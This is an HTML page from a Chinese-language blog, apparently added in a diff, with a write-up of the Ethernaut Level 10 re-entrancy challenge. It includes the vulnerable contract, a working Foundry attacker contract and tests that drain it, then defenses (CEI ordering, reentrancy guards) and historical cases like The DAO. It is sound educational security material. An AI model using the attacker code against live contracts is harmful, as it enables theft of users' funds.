@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 10: Re-entrancy - 经典重入攻击详解 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解"><a href="#🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解" class="headerlink" title="🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解"></a>🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/10">Ethernaut Level 10 - Re-entrancy</a><br><strong>攻击类型</strong>: 重入攻击 (Reentrancy Attack)<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>历史影响</strong>: The DAO 攻击事件 (2016年)</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>这是智能合约安全领域最经典的攻击类型之一：</p>
+<ol>
+<li><strong>窃取合约资金</strong> - 提取超过自己存款金额的以太币</li>
+<li><strong>理解重入原理</strong> - 掌握状态更新时序问题</li>
+<li><strong>学习防护措施</strong> - 了解如何编写安全的提款函数</li>
+</ol>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="合约源码分析"><a href="#合约源码分析" class="headerlink" title="合约源码分析"></a>合约源码分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 🚨 漏洞函数</span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞识别"><a href="#漏洞识别" class="headerlink" title="漏洞识别"></a>漏洞识别</h3><p>重入攻击的根本原因是 <strong>检查-效果-交互 (CEI)</strong> 模式的违反：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">    // ✅ 检查 (Check)</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">        </span><br><span class="line">        // ❌ 交互 (Interaction) - 过早进行外部调用</span><br><span class="line">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">        if(result) &#123;</span><br><span class="line">            // ❌ 效果 (Effect) - 状态更新太晚</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><ol>
+<li><strong>恶意合约存款</strong> - 向目标合约存入少量资金</li>
+<li><strong>调用提款函数</strong> - 触发 <code>withdraw()</code> 函数</li>
+<li><strong>接收回调</strong> - 在 <code>call</code> 执行时触发恶意合约的 <code>receive()</code> 函数</li>
+<li><strong>递归调用</strong> - 在状态更新前再次调用 <code>withdraw()</code></li>
+<li><strong>重复提取</strong> - 由于余额未更新，可以多次提取资金</li>
+</ol>
+<h3 id="攻击流程图"><a href="#攻击流程图" class="headerlink" title="攻击流程图"></a>攻击流程图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用户调用 withdraw(1 ether)</span><br><span class="line">    ↓</span><br><span class="line">检查 balances[attacker] &gt;= 1 ether ✅</span><br><span class="line">    ↓</span><br><span class="line">发送 1 ether 到攻击者合约</span><br><span class="line">    ↓</span><br><span class="line">攻击者合约的 receive() 被触发</span><br><span class="line">    ↓</span><br><span class="line">再次调用 withdraw(1 ether)</span><br><span class="line">    ↓</span><br><span class="line">检查 balances[attacker] &gt;= 1 ether ✅ (余额未更新!)</span><br><span class="line">    ↓</span><br><span class="line">再次发送 1 ether...</span><br><span class="line">    ↓</span><br><span class="line">如此重复，直到合约余额耗尽</span><br></pre></td></tr></table></figure>
+
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Reentrance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ReentrancyAttacker &#123;</span><br><span class="line">    Reentrance public target;</span><br><span class="line">    uint public amount;</span><br><span class="line">    </span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = Reentrance(_target);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">        amount = msg.value;</span><br><span class="line">        </span><br><span class="line">        // 步骤1: 先存入一些资金建立余额</span><br><span class="line">        target.donate&#123;value: amount&#125;(address(this));</span><br><span class="line">        </span><br><span class="line">        // 步骤2: 开始重入攻击</span><br><span class="line">        target.withdraw(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 重入攻击的核心 - receive函数</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        if (address(target).balance &gt;= amount) &#123;</span><br><span class="line">            // 递归调用withdraw，实现重入</span><br><span class="line">            target.withdraw(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentranceTest is Test &#123;</span><br><span class="line">    Reentrance public reentrance;</span><br><span class="line">    ReentrancyAttacker public attacker;</span><br><span class="line">    </span><br><span class="line">    address public user1 = makeAddr(&quot;user1&quot;);</span><br><span class="line">    address public user2 = makeAddr(&quot;user2&quot;);</span><br><span class="line">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 部署目标合约</span><br><span class="line">        reentrance = new Reentrance();</span><br><span class="line">        </span><br><span class="line">        // 给用户一些初始资金</span><br><span class="line">        vm.deal(user1, 10 ether);</span><br><span class="line">        vm.deal(user2, 10 ether);</span><br><span class="line">        vm.deal(attackerAddr, 2 ether);</span><br><span class="line">        </span><br><span class="line">        // 模拟正常用户存款</span><br><span class="line">        vm.prank(user1);</span><br><span class="line">        reentrance.donate&#123;value: 5 ether&#125;(user1);</span><br><span class="line">        </span><br><span class="line">        vm.prank(user2);</span><br><span class="line">        reentrance.donate&#123;value: 5 ether&#125;(user2);</span><br><span class="line">        </span><br><span class="line">        // 部署攻击合约</span><br><span class="line">        vm.prank(attackerAddr);</span><br><span class="line">        attacker = new ReentrancyAttacker(address(reentrance));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testReentrancyAttack() public &#123;</span><br><span class="line">        uint256 contractBalanceBefore = address(reentrance).balance;</span><br><span class="line">        uint256 attackerBalanceBefore = attackerAddr.balance;</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;合约余额 (攻击前):&quot;, contractBalanceBefore);</span><br><span class="line">        console.log(&quot;攻击者余额 (攻击前):&quot;, attackerBalanceBefore);</span><br><span class="line">        </span><br><span class="line">        // 执行重入攻击</span><br><span class="line">        vm.prank(attackerAddr);</span><br><span class="line">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class="line">        </span><br><span class="line">        uint256 contractBalanceAfter = address(reentrance).balance;</span><br><span class="line">        uint256 attackerBalanceAfter = attacker.getBalance();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;合约余额 (攻击后):&quot;, contractBalanceAfter);</span><br><span class="line">        console.log(&quot;攻击者余额 (攻击后):&quot;, attackerBalanceAfter);</span><br><span class="line">        </span><br><span class="line">        // 验证攻击成功</span><br><span class="line">        assertEq(contractBalanceAfter, 0);</span><br><span class="line">        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testReentrancyDetails() public &#123;</span><br><span class="line">        vm.prank(attackerAddr);</span><br><span class="line">        </span><br><span class="line">        // 记录每次withdraw调用</span><br><span class="line">        vm.recordLogs();</span><br><span class="line">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class="line">        </span><br><span class="line">        // 验证攻击者的余额记录</span><br><span class="line">        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0</span><br><span class="line">        assertEq(address(reentrance).balance, 0); // 合约被掏空</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运行重入攻击测试</span></span><br><span class="line">forge <span class="built_in">test</span> --match-contract ReentranceTest -vvv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出应该显示合约余额被完全掏空</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="1-CEI-模式-Check-Effects-Interactions"><a href="#1-CEI-模式-Check-Effects-Interactions" class="headerlink" title="1. CEI 模式 (Check-Effects-Interactions)"></a>1. CEI 模式 (Check-Effects-Interactions)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract SecureReentrance &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) public &#123;</span><br><span class="line">        // ✅ 检查 (Check)</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        </span><br><span class="line">        // ✅ 效果 (Effect) - 先更新状态</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        </span><br><span class="line">        // ✅ 交互 (Interaction) - 最后进行外部调用</span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-重入锁-Reentrancy-Guard"><a href="#2-重入锁-Reentrancy-Guard" class="headerlink" title="2. 重入锁 (Reentrancy Guard)"></a>2. 重入锁 (Reentrancy Guard)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract ReentrancyGuarded &#123;</span><br><span class="line">    bool private locked;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    </span><br><span class="line">    modifier noReentrant() &#123;</span><br><span class="line">        require(!locked, &quot;Reentrant call&quot;);</span><br><span class="line">        locked = true;</span><br><span class="line">        _;</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) public noReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        </span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-使用-OpenZeppelin-的-ReentrancyGuard"><a href="#3-使用-OpenZeppelin-的-ReentrancyGuard" class="headerlink" title="3. 使用 OpenZeppelin 的 ReentrancyGuard"></a>3. 使用 OpenZeppelin 的 ReentrancyGuard</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SafeContract is ReentrancyGuard &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    </span><br><span class="line">    function withdraw(uint _amount) public nonReentrant &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class="line">        </span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-使用-transfer-而非-call"><a href="#4-使用-transfer-而非-call" class="headerlink" title="4. 使用 transfer() 而非 call()"></a>4. 使用 transfer() 而非 call()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// ⚠️ 有限防护（不推荐作为唯一防护措施）</span><br><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class="line">    </span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="📚-核心知识点"><a href="#📚-核心知识点" class="headerlink" title="📚 核心知识点"></a>📚 核心知识点</h2><h3 id="1-重入攻击类型"><a href="#1-重入攻击类型" class="headerlink" title="1. 重入攻击类型"></a>1. 重入攻击类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>单函数重入</strong></td>
+<td>攻击同一个函数</td>
+<td>本关卡的 <code>withdraw()</code></td>
+</tr>
+<tr>
+<td><strong>跨函数重入</strong></td>
+<td>攻击不同函数</td>
+<td><code>withdraw()</code> → <code>transfer()</code></td>
+</tr>
+<tr>
+<td><strong>跨合约重入</strong></td>
+<td>攻击不同合约</td>
+<td>DeFi 协议间的复杂重入</td>
+</tr>
+</tbody></table>
+<h3 id="2-Gas-限制对比"><a href="#2-Gas-限制对比" class="headerlink" title="2. Gas 限制对比"></a>2. Gas 限制对比</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// transfer/send: 2300 gas (不足以进行重入)</span><br><span class="line">payable(msg.sender).transfer(amount);</span><br><span class="line"></span><br><span class="line">// call: 转发所有剩余 gas (可能导致重入)</span><br><span class="line">(bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-状态更新时序"><a href="#3-状态更新时序" class="headerlink" title="3. 状态更新时序"></a>3. 状态更新时序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// ❌ 错误模式</span><br><span class="line">function vulnerable() public &#123;</span><br><span class="line">    require(condition);        // Check</span><br><span class="line">    externalCall();           // Interaction (危险!)</span><br><span class="line">    updateState();            // Effect (太晚了)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 正确模式</span><br><span class="line">function secure() public &#123;</span><br><span class="line">    require(condition);        // Check</span><br><span class="line">    updateState();            // Effect (先更新状态)</span><br><span class="line">    externalCall();           // Interaction (安全)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🏛️-历史案例"><a href="#🏛️-历史案例" class="headerlink" title="🏛️ 历史案例"></a>🏛️ 历史案例</h2><h3 id="The-DAO-攻击-2016年6月"><a href="#The-DAO-攻击-2016年6月" class="headerlink" title="The DAO 攻击 (2016年6月)"></a>The DAO 攻击 (2016年6月)</h3><ul>
+<li><strong>损失</strong>: 360万 ETH (当时价值约6000万美元)</li>
+<li><strong>原因</strong>: splitDAO 函数存在重入漏洞</li>
+<li><strong>后果</strong>: 以太坊硬分叉，产生 ETH 和 ETC</li>
+<li><strong>教训</strong>: 重入攻击的破坏性和防护重要性</li>
+</ul>
+<h3 id="其他著名案例"><a href="#其他著名案例" class="headerlink" title="其他著名案例"></a>其他著名案例</h3><ol>
+<li><strong>Cream Finance</strong> (2021) - 1.3亿美元损失</li>
+<li><strong>bZx Protocol</strong> (2020) - 多次重入攻击</li>
+<li><strong>Uniswap V1</strong> (早期版本) - 理论漏洞</li>
+</ol>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p>重入攻击是智能合约安全的基石知识：</p>
+<ul>
+<li>✅ <strong>理解 CEI 模式的重要性</strong></li>
+<li>✅ <strong>掌握多种防护措施的使用</strong></li>
+<li>✅ <strong>认识状态管理的关键性</strong></li>
+<li>✅ <strong>学习历史案例的教训</strong></li>
+</ul>
+<p>重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。</p>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-level-09-king/">上一关: Level 9 - King</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-11-elevator/">下一关: Level 11 - Elevator</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+<hr>
+<p><em>安全的合约不仅要做正确的事，还要以正确的顺序做事。</em> 🔐</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
